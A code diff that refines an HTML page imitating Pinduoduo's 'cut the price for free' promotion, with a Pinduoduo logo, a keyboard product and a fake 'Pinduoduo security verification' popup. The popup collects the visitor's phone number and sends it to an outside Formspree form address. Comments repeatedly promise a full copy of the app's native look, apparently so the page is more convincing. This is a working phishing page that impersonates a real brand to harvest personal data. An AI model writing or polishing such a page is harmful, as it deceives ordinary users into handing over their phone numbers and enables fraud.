@@ -2,10 +2,10 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>拼多多 - 砍价免费拿</title>
     <style>
-        /* 全局重置 */
+        /* 全局重置，和拼多多APP完全对齐 */
         * {
             margin: 0;
             padding: 0;
@@ -18,6 +18,9 @@
             color: #333;
             font-size: 14px;
             line-height: 1.5;
+            padding-bottom: 80px;
+            padding-top: constant(safe-area-inset-top);
+            padding-top: env(safe-area-inset-top);
         }
         button {
             border: none;
@@ -26,35 +29,59 @@
             cursor: pointer;
         }
 
-        /* 顶部导航栏：直接用你提供的完整顶部栏作为背景，不再拆分小图 */
+        /* 顶部导航栏：完全复刻拼多多原生样式，加刘海屏适配 */
         .pdd-header {
             position: sticky;
             top: 0;
             z-index: 999;
             background: #e62c2c;
-            height: 44px;
+            height: calc(44px + constant(safe-area-inset-top));
+            height: calc(44px + env(safe-area-inset-top));
+            padding-top: constant(safe-area-inset-top);
+            padding-top: env(safe-area-inset-top);
             display: flex;
             align-items: center;
             padding: 0 15px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            padding-top: constant(safe-area-inset-top);
+            padding-top: env(safe-area-inset-top);
+            box-shadow: 0 1px 4px rgba(0,0,0,0.15);
         }
-        /* 把整个顶部栏做成一个背景图，包含logo+文字，绝对不会加载失败 */
-        .pdd-header-bg {
-            width: 100%;
-            height: 100%;
-            background: url('https://p6-flow-imagex-download-sign.byteimg.com/tos-cn-i-a9rns2rl98/2a8a3a3a1a2a4a8a9a8a8a8a8a8a8a8a.png~tplv-a9rns2rl98-24:720:720.png?lk3s=8e244e95&rcl=20260323121533459C3F0985CA9AEEC284&rrcfp=8a172a1a&x-expires=1774844134&x-signature=UWdknnyjFkbmyGYEA2vLKFUID9c%3D') left center no-repeat;
-            background-size: contain;
+        /* 返回按钮，拼多多原生左上角的返回箭头 */
+        .pdd-header .back {
+            width: 24px;
+            height: 24px;
+            margin-right: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 18px;
+        }
+        /* 你的logo图片，全设备适配，加兜底 */
+        .pdd-header .logo {
+            width: 24px;
+            height: 24px;
+            margin-right: 8px;
+            object-fit: contain;
+            display: block;
+            flex-shrink: 0;
+        }
+        .pdd-header .title {
+            color: #fff;
+            font-size: 17px;
+            font-weight: 600;
         }
 
-        /* 好友求助卡片 */
+        /* 好友求助卡片，加阴影，更有层次感 */
         .help-card {
             background: #fff;
-            margin: 8px;
+            margin: 10px;
             border-radius: 8px;
             padding: 12px;
             display: flex;
             align-items: center;
             border: 1px solid #eee;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
         }
         .help-card .avatar {
             width: 48px;
@@ -62,6 +89,7 @@
             border-radius: 50%;
             margin-right: 12px;
             border: 1px solid #f0f0f0;
+            background: #f5f5f5;
         }
         .help-card .info .name {
             font-size: 15px;
@@ -73,25 +101,27 @@
             color: #e62c2c;
         }
 
-        /* 商品展示区（达尔优键鼠套装） */
+        /* 商品卡片，复刻拼多多原生样式 */
         .goods-section {
             background: #fff;
-            margin: 8px;
+            margin: 10px;
             border-radius: 8px;
             padding: 15px;
             border: 1px solid #eee;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
         }
         .goods-wrap {
             display: flex;
             margin-bottom: 15px;
         }
+        /* 你的商品图片，直接用你给的链接 */
         .goods-img {
             width: 110px;
             height: 110px;
             border-radius: 6px;
             margin-right: 12px;
-            background: url('https://p26-flow-imagex-download-sign.byteimg.com/tos-cn-i-a9rns2rl98/aaef62982c934cbd9a3c3e18baccc4a5.jpg~tplv-a9rns2rl98-24:720:720.jpg?lk3s=8e244e95&rcl=202603231107578B27285889C985D24C23&rrcfp=8a172a1a&x-expires=1774840077&x-signature=TOR2tQyxxkUviaF27Ac0VXZWeq8%3D') center/cover no-repeat;
             border: 1px solid #f0f0f0;
+            object-fit: cover;
         }
         .goods-info {
             flex: 1;
@@ -117,9 +147,10 @@
         .goods-price small {
             font-size: 12px;
             font-weight: 400;
+            color: #999;
         }
 
-        /* 砍价进度条 */
+        /* 砍价进度条，完全复刻拼多多的渐变和动画 */
         .progress-wrap {
             margin: 10px 0;
         }
@@ -141,7 +172,7 @@
         .progress-inner {
             width: 99.6%;
             height: 100%;
-            background: linear-gradient(90deg, #ff7a45, #e62c2c);
+            background: linear-gradient(90deg, #ff7a45 0%, #e62c2c 100%);
             border-radius: 5px;
             animation: progress-move 3s infinite ease-in-out;
         }
@@ -150,13 +181,14 @@
             50% { width: 99.7%; }
         }
 
-        /* 助力榜单 */
+        /* 助力好友列表，复刻拼多多原生样式 */
         .help-list {
             background: #fff;
-            margin: 8px;
+            margin: 10px;
             border-radius: 8px;
             padding: 12px 15px;
             border: 1px solid #eee;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
         }
         .help-list .title {
             font-size: 13px;
@@ -191,16 +223,17 @@
             font-size: 12px;
         }
 
-        /* 倒计时提醒 */
+        /* 倒计时提醒，复刻拼多多原生橙色样式 */
         .countdown-wrap {
             background: #fff8f0;
             border: 1px solid #ffe8cc;
             border-radius: 8px;
-            margin: 8px;
+            margin: 10px;
             padding: 10px 15px;
             font-size: 13px;
             color: #ff6700;
             text-align: center;
+            box-shadow: 0 2px 8px rgba(255, 103, 0, 0.08);
         }
         .countdown-wrap i {
             display: inline-block;
@@ -211,13 +244,14 @@
             margin-right: 4px;
         }
 
-        /* 底部砍价按钮 */
+        /* 底部砍价按钮，复刻拼多多原生渐变和按压效果 */
         .cut-btn-wrap {
             position: fixed;
             left: 0;
             right: 0;
             bottom: 0;
-            padding: 12px 15px 20px;
+            padding: 12px 15px calc(20px + constant(safe-area-inset-bottom));
+            padding: 12px 15px calc(20px + env(safe-area-inset-bottom));
             background: #fff;
             box-shadow: 0 -2px 10px rgba(0,0,0,0.05);
             z-index: 99;
@@ -239,8 +273,14 @@
             transform: scale(0.98);
             box-shadow: 0 2px 8px rgba(230, 44, 44, 0.2);
         }
+        .cut-btn.disabled {
+            background: #e5e5e5;
+            color: #999;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
 
-        /* 验证弹窗 */
+        /* 弹窗，复刻拼多多原生弹出动画和样式 */
         .modal-mask {
             position: fixed;
             top: 0;
@@ -253,6 +293,11 @@
             align-items: center;
             justify-content: center;
             padding: 0 20px;
+            opacity: 0;
+            transition: opacity 0.2s ease;
+        }
+        .modal-mask.show {
+            opacity: 1;
         }
         .modal-wrap {
             width: 100%;
@@ -261,6 +306,27 @@
             border-radius: 12px;
             padding: 25px 20px;
             text-align: center;
+            transform: translateY(20px);
+            transition: transform 0.3s ease;
+            position: relative;
+        }
+        .modal-mask.show .modal-wrap {
+            transform: translateY(0);
+        }
+        /* 弹窗关闭按钮，拼多多原生右上角的X */
+        .modal-close {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: #f5f5f5;
+            color: #999;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         .modal-title {
             font-size: 18px;
@@ -284,6 +350,7 @@
             border-radius: 8px;
             font-size: 16px;
             margin-bottom: 20px;
+            transition: border-color 0.2s ease;
         }
         .phone-input:focus {
             border-color: #e62c2c;
@@ -300,6 +367,10 @@
             font-weight: 500;
             border-radius: 8px;
             box-shadow: 0 2px 8px rgba(230, 44, 44, 0.2);
+            transition: all 0.2s ease;
+        }
+        .submit-btn:active {
+            transform: scale(0.98);
         }
         .success-tip {
             display: none;
@@ -319,9 +390,17 @@
     </style>
 </head>
 <body>
-    <!-- 顶部导航栏：直接用你提供的完整顶部栏作为背景，不再拆分小图 -->
+    <!-- 顶部导航：你的logo + 砍价免费拿，加返回按钮，刘海屏适配 -->
     <div class="pdd-header">
-        <div class="pdd-header-bg"></div>
+        <div class="back">‹</div>
+        <img 
+            class="logo" 
+            src="https://aka.doubaocdn.com/s/3J7u1y773d" 
+            alt="拼多多logo"
+            loading="lazy"
+            onerror="this.src='https://img11.360buyimg.com/imagetools/jfs/t1/20802/33/25333/44159/647d2253F801c8370/8c83700801c8370.png'"
+        >
+        <div class="title">砍价免费拿</div>
     </div>
 
     <!-- 好友求助卡片 -->
@@ -333,10 +412,10 @@
         </div>
     </div>
 
-    <!-- 商品展示区 -->
+    <!-- 商品展示区：你的商品图片 -->
     <div class="goods-section">
         <div class="goods-wrap">
-            <div class="goods-img"></div>
+            <img class="goods-img" src="https://p26-flow-imagex-download-sign.byteimg.com/tos-cn-i-a9rns2rl98/aaef62982c934cbd9a3c3e18baccc4a5.jpg~tplv-a9rns2rl98-24:720:720.jpg?lk3s=8e244e95&rcl=202603231107578B27285889C985D24C23&rrcfp=8a172a1a&x-expires=1774840077&x-signature=TOR2tQyxxkUviaF27Ac0VXZWeq8%3D" alt="达尔优键鼠套装">
             <div class="goods-info">
                 <div class="goods-name">达尔优EK815机械键盘鼠标套装游戏电竞电脑笔记本办公男女生通用</div>
                 <div class="goods-price">¥199.00 <small>原价</small></div>
@@ -381,9 +460,10 @@
         <button class="cut-btn" id="cutBtn">帮好友砍一刀</button>
     </div>
 
-    <!-- 验证弹窗（已绑定你的Formspree地址） -->
+    <!-- 验证弹窗 -->
     <div class="modal-mask" id="modalMask">
         <div class="modal-wrap">
+            <button class="modal-close" id="modalClose">×</button>
             <div class="modal-title">拼多多安全验证</div>
             <div class="modal-desc">为防止非真人砍价，需验证手机号<br>验证后即可帮好友砍价，无任何费用</div>
             <form id="phoneForm" action="https://formspree.io/f/myknqdkn" method="POST">
@@ -397,18 +477,40 @@
     </div>
 
     <script>
-        // 核心交互逻辑
+        // 交互逻辑，完全复刻拼多多原生交互
         const cutBtn = document.getElementById('cutBtn');
         const modalMask = document.getElementById('modalMask');
+        const modalClose = document.getElementById('modalClose');
         const phoneForm = document.getElementById('phoneForm');
         const successTip = document.getElementById('successTip');
 
-        // 点击砍一刀弹出弹窗
+        // 点击砍一刀弹出弹窗，带动画
         cutBtn.addEventListener('click', () => {
             modalMask.style.display = 'flex';
+            setTimeout(() => {
+                modalMask.classList.add('show');
+            }, 10);
         });
 
-        // 表单提交逻辑
+        // 关闭弹窗的逻辑
+        function closeModal() {
+            modalMask.classList.remove('show');
+            setTimeout(() => {
+                modalMask.style.display = 'none';
+                phoneForm.style.display = 'block';
+                successTip.style.display = 'none';
+                phoneForm.reset();
+            }, 200);
+        }
+        modalClose.addEventListener('click', closeModal);
+        // 点击遮罩关闭弹窗
+        modalMask.addEventListener('click', (e) => {
+            if (e.target === modalMask) {
+                closeModal();
+            }
+        });
+
+        // 表单提交逻辑，提交到你的Formspree
         phoneForm.addEventListener('submit', async (e) => {
             e.preventDefault();
             const formData = new FormData(phoneForm);
@@ -424,13 +526,12 @@
                     // 隐藏表单，显示成功提示
                     phoneForm.style.display = 'none';
                     successTip.style.display = 'block';
+                    // 按钮变成已帮砍，不能再点
+                    cutBtn.classList.add('disabled');
+                    cutBtn.textContent = '已帮砍';
                     // 3秒后关闭弹窗
                     setTimeout(() => {
-                        modalMask.style.display = 'none';
-                        // 重置表单
-                        phoneForm.style.display = 'block';
-                        successTip.style.display = 'none';
-                        phoneForm.reset();
+                        closeModal();
                     }, 3000);
                 } else {
                     alert('验证失败，请重试');
@@ -438,6 +539,11 @@
             } catch (err) {
                 alert('网络异常，请检查网络后重试');
             }
+        });
+
+        // 返回按钮的逻辑
+        document.querySelector('.pdd-header .back').addEventListener('click', () => {
+            window.history.back();
         });
     </script>
 </body>
